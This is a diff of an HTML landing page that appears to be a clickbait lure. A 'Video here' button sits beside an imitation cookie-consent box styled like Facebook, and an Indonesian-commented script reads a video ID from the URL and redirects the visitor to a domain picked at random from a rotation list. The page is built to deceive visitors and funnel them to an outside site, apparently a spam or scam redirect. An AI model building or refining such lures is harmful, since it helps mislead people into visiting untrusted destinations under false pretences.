@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -33,10 +33,10 @@
             border: none;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            transition: transform 0.2s, background-color 0.2s;
+            transition: transform 0.2s;
             z-index: 5;
         }
-        .btn-main:active { transform: scale(0.96); background-color: #1a1a1a; }
+        .btn-main:active { transform: scale(0.96); }
 
         /* Cookie Modal */
         .cookie-overlay {
@@ -78,11 +78,8 @@
             cursor: pointer;
             border: 1px solid #e0e0e0;
             background: #fff;
-            transition: background 0.2s;
         }
         .c-btn-blue { background: #1877f2; color: #fff; border: none; }
-        .c-btn:active { background: #f0f2f5; }
-        .c-btn-blue:active { background: #1565c0; }
 
         .footer-brand {
             margin-top: 15px;
@@ -98,7 +95,7 @@
 </head>
 <body>
 
-    <button class="btn-main" onclick="toOriginalSite()">
+    <button class="btn-main" onclick="startLoading()">
         <i class="fa-solid fa-link"></i> 🔗👉Video here🔗
     </button>
 
@@ -114,23 +111,33 @@
             </div>
 
             <div class="footer-brand">
-                Powered by <i class="fa-solid fa-shield-check" style="color:#1877f2"></i> <strong>CookieAdmin</strong>
+                Powered by <i class="fa-solid fa-shield-halved" style="color:#1877f2"></i> <strong>CookieAdmin</strong>
             </div>
         </div>
     </div>
 
     <script>
-        // GANTI INI dengan URL website aslimu
-        const websiteAsli = "https://mogoflox.it.com/";
+        // --- LOGIKA ASLI KAMU (TIDAK DIRUBAH) ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const videoId = urlParams.get('id') || 'default';
 
-        function toOriginalSite() {
-            window.location.href = websiteAsli;
+        const daftarDomain = [
+            "https://mogoflox.it.com/",
+        ];
+
+        const domainTerpilih = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
+        const finalLink = domainTerpilih + videoId;
+
+        function startLoading() {
+            // Langsung redirect ke link yang sudah membawa ID
+            window.location.href = finalLink;
         }
 
         function hideCookie() {
             document.getElementById('cookieBox').style.display = 'none';
         }
-    </script>
 
+        // Histats tetap bisa ditaruh di sini jika diperlukan
+    </script>
 </body>
 </html>
